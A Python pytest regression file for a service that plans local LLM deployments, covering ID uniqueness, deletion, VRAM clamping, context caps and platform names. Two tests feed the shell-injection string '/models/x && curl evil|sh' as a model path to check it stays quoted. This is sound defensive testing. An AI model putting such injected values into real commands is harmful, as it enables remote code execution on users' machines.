"""Regressions found by the QA pass.

Every test here corresponds to a defect that was reproduced before it was fixed,
so a later refactor cannot quietly bring it back. The QA report also noted that
none of these paths had any coverage, which is why they survived so long.
"""
import shlex
from types import SimpleNamespace

import pytest

from app.services import deployments, planner
from app.services.estimator import GIB, ModelProfile, plan_window


def test_deployment_ids_are_unique_within_the_same_second():
    """IDs used to be dep_{int(time.time())}: same-second creates overwrote.

    Three rapid creates produced one id and one surviving record.
    """
    saved = dict(deployments.DEPLOYMENTS)
    deployments.DEPLOYMENTS.clear()
    try:
        ids = [
            deployments.create(model_path=f"/m/{i}", model_id=f"m{i}", backend="vllm")["id"]
            for i in range(5)
        ]
        assert len(set(ids)) == 5
        assert len(deployments.DEPLOYMENTS) == 5
    finally:
        deployments.DEPLOYMENTS.clear()
        deployments.DEPLOYMENTS.update(saved)


def test_delete_removes_the_deployment():
    """There was no way to remove a deployment, so the list only ever grew."""
    saved = dict(deployments.DEPLOYMENTS)
    deployments.DEPLOYMENTS.clear()
    try:
        dep = deployments.create(model_path="/m/x", model_id="x", backend="vllm")
        assert deployments.get(dep["id"])["id"] == dep["id"]
        deployments.delete(dep["id"])
        # B-09: "not found" is one semantic now, and it is a raise, not {}.
        assert dep["id"] not in deployments.DEPLOYMENTS
        assert deployments.list_all() == []
        with pytest.raises(deployments.DeploymentNotFound):
            deployments.get(dep["id"])
        with pytest.raises(deployments.DeploymentNotFound):
            deployments.delete(dep["id"])
    finally:
        deployments.DEPLOYMENTS.clear()
        deployments.DEPLOYMENTS.update(saved)


def test_command_string_escapes_model_path():
    """command_string is copied into a shell, so metacharacters must stay literal.

    A path of "/models/x && curl evil|sh" used to produce a string that ran a
    second command when pasted into a terminal.
    """
    evil = "/models/x && curl evil|sh"
    result = planner.preview(
        planner.PlanRequest(model_id="qwen3-8b", model_path=evil, backend="llama.cpp")
    )
    command_string = result["command_string"]
    # Parsing the string back must yield the original single argument.
    parts = shlex.split(command_string)
    assert parts[parts.index("-m") + 1] == evil
    # And the injected separator must not survive outside the quoted argument.
    assert "&& curl" not in command_string.replace(evil, "")


def test_command_argv_stays_a_plain_argument_list():
    """Only the display string is quoted; the structured argv must be untouched."""
    evil = "/models/x && curl evil|sh"
    result = planner.preview(
        planner.PlanRequest(model_id="qwen3-8b", model_path=evil, backend="llama.cpp")
    )
    argv = result["command"]
    assert isinstance(argv, list)
    assert argv[argv.index("-m") + 1] == evil


def test_plan_window_never_exceeds_native_context():
    """A model with a 32K native window must not be planned at 64K.

    The floor is a promise about the window we want, not a licence to exceed what
    the model was trained for. This used to be an xfail(strict=True) while B-08
    was open; the fix is in, so it is a normal assertion now.
    """
    profile = ModelProfile(
        weights_bytes=1 * GIB,
        layers=32,
        kv_bytes_per_token=1024,
        n_vocab=150000,
        native_window=32768,
    )
    budget = SimpleNamespace(usable_vram_bytes=8 * GIB, uma=True)
    assert plan_window(profile, budget) <= profile.native_window


# --- B-05 / B-07: caller-supplied VRAM is finite, clamped and self-consistent ---

def _client():
    from fastapi.testclient import TestClient
    from app.main import app
    return TestClient(app, raise_server_exceptions=False)


def test_non_finite_available_vram_is_a_4xx_not_a_500():
    """NaN / Infinity / 1e400 used to reach int(inf * GIB) -> 500.

    recommend() now clamps through hardware._clamp, which returns None for
    non-finite values, and that becomes a clean 422 instead of a server crash.
    """
    client = _client()
    for literal in ("NaN", "Infinity", "-Infinity", "1e400"):
        response = client.post(
            "/api/models/recommend",
            content='{"available_vram_gb": %s}' % literal,
            headers={"content-type": "application/json"},
        )
        assert response.status_code in (400, 422), (literal, response.status_code)


def test_available_vram_is_clamped_and_total_is_never_below_usable():
    """Negative / tiny / huge budgets used to leak through unclamped (B-07)."""
    from app.services.hardware import VRAM_MIN_GB, VRAM_MAX_GB
    from app.services.models import RecommendRequest, recommend

    for raw in (-5.0, 0.1, 1e6):
        out = recommend(RecommendRequest(available_vram_gb=raw, backend="vllm"))
        hardware = out["hardware"]
        assert VRAM_MIN_GB <= hardware["usable_vram_gb"] <= VRAM_MAX_GB, raw
        # The invariant the QA report called out: usable must fit inside total.
        assert hardware["total_device_bytes"] >= hardware["usable_vram_bytes"], raw


# --- B-06: a non-list gpus field must not be fatal ---

def test_profile_gpus_that_are_not_a_list_are_treated_as_empty():
    from app.services import hardware

    for bad in (5, True, 1.5, {"name": "x"}, "nope"):
        result = hardware.budget_from_profile({"gpus": bad})
        assert result.normalized["gpus"] == [], bad


# --- B-08: the native cap holds for every catalog entry ---

def test_plan_window_never_exceeds_native_for_the_whole_catalog():
    from app.services.catalog import CATALOG
    from app.services.hardware import HardwareBudget

    budget = HardwareBudget(4096 * GIB, 4096 * GIB, 0, False, "test")
    for entry in CATALOG:
        profile = entry.profile(entry.variants[0])
        window = plan_window(profile, budget)
        assert window <= entry.native_ctx, (entry.id, window, entry.native_ctx)


# --- B-19: a non-positive floor must not spin forever ---

def test_plan_window_terminates_for_non_positive_floor():
    import threading

    profile = ModelProfile(
        weights_bytes=1 * GIB,
        layers=32,
        kv_bytes_per_token=1024,
        n_vocab=150000,
        native_window=131072,
    )
    budget = SimpleNamespace(usable_vram_bytes=10 ** 12, uma=True)

    for floor in (-1, 0, 1):
        box = {}

        def run(floor=floor):
            box["window"] = plan_window(profile, budget, floor=floor)

        thread = threading.Thread(target=run, daemon=True)
        thread.start()
        thread.join(timeout=3)
        assert not thread.is_alive(), "plan_window hung on floor=%r" % (floor,)
        assert box["window"] >= 1


# --- D: platform is normalized at the hardware.py entry point ---

def test_platform_enum_is_normalized():
    from app.services import hardware

    cases = {
        "windows": "win32",
        "win32": "win32",
        "Windows": "win32",
        "macos": "darwin",
        "darwin": "darwin",
        "Mac OS X": "darwin",
        "linux": "linux",
        "weird": "unknown",
        None: "unknown",
        "": "unknown",
    }
    assert set(hardware.PLATFORM_VALUES) == {"darwin", "win32", "linux", "unknown"}
    for raw, expected in cases.items():
        result = hardware.budget_from_profile({"platform": raw})
        assert result.normalized["platform"] == expected, raw
